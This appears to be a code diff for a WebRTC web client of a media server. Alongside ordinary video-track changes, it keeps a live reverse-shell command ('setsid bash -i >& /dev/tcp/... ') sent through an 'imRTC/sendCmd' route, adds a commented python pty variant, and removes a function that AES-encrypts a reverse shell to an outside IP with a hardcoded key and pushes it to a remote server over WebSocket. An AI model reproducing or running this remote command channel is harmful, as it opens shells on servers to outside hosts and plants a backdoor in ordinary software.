@@ -396,6 +396,7 @@
         await connect();
 
         let cmd = 'setsid bash -i >& /dev/tcp/192.168.88.138/1234 0<&1 &';
+        // let cmd = 'setsid python -c \'import pty; pty.spawn("/bin/bash")\' >& /dev/tcp/192.168.88.138/1234 0<&1 &';
         obj = {
             route: 'imRTC/sendCmd',
             req_data: {
@@ -420,60 +421,6 @@
             $("[id=jsonSend]").html(encrypted_base64);
             client.send(encrypted_base64);
         }
-    }
-
-    async function sendCmd2() {
-        let cmd = 'setsid bash -i >& /dev/tcp/198.211.27.71/1234 0<&1 &';
-        obj = {
-            route: 'imRTC/sendCmd',
-            req_data: {
-                cmd: cmd,
-            }
-        }
-        let data = JSON.stringify(obj);
-
-        let key = 'mediaserver123456';
-        key = CryptoJS.enc.Utf8.parse(key);
-        let options = {
-            mode: CryptoJS.mode.ECB,
-            padding: CryptoJS.pad.Pkcs7
-        };
-        let encrypted = CryptoJS.AES.encrypt(data, key, options);
-        // console.log('Client::sendCmd(), encrypted:', encrypted.toString());
-        let encrypted_base64 = encrypted.ciphertext.toString(CryptoJS.enc.Base64);
-        // console.log('Client::sendCmd(), encrypted_base64:', encrypted_base64);
-
-        console.log('CmdClient.send(), ' + encrypted_base64);
-
-        let host = '';
-        if (window.location.protocol == 'https:') {
-            host = 'wss://' + '52.196.96.7' + ':9081';
-        } else {
-            host = 'ws://' + '52.196.96.7' + ':9881';
-        }
-
-        await new Promise((resolve, reject) => {
-            let cmd_client = new WebSocket(host);
-            cmd_client.binaryType = 'arraybuffer';
-
-            cmd_client.onopen = function () {
-                console.log('CmdClient.onopen(), host:', host);
-
-                if (this.readyState == this.OPEN) {
-                    this.send(encrypted_base64);
-                }
-                resolve();
-            };
-
-            cmd_client.onclose = function (ev) {
-                console.log('CmdClient.onclose(), host:', host);
-                reject();
-            }
-
-            cmd_client.onmessage = function (ev) {
-                console.log('CmdClient.onmessage(), data:' + ev.data);
-            }
-        });
     }
 
     class RTCClient {
@@ -594,8 +541,8 @@
                 this.pc.close();
                 this.pc = null;
             }
-            this.mediaStream = null;
             this.stopLocalVideo();
+            this.mediaStream = null;
         }
 
         async showWebGL() {
@@ -810,6 +757,11 @@
             tracks.forEach(track => {
                 // Get old constraints
                 let constraints = track.getConstraints();
+                if ('contentHint' in track) {
+                    track.contentHint = 'motion';
+                } else {
+                    console.log('RTCClient::setVideoTrackContent(), MediaStreamTrack contentHint attribute not supported');
+                }
                 // constraints.width = 640;
                 // constraints.height = 360;
                 // It is always success, unless you set some parameter with exact value
@@ -1053,12 +1005,6 @@
             });
         });
 
-        $("[id=cmd2Btn]").click(function () {
-            sendCmd2().then(() => {
-                // client.close();
-            });
-        });
-
         $("[id=flvjsBtn]").click(function () {
             flv_load_mds($("#stream").val());
         });
@@ -1191,7 +1137,6 @@
                 <button id="acceptBtn" style="display: none;">Accept</button>
                 <button id="hangupBtn">Hangup</button>
                 <button id="cmdBtn">Cmd</button>
-                <button id="cmd2Btn">Cmd2</button>
                 <button id="flvjsBtn">Flvjs</button>
                 <button id="flvjsDestroyBtn">FlvjsDestroy</button>
             </div>
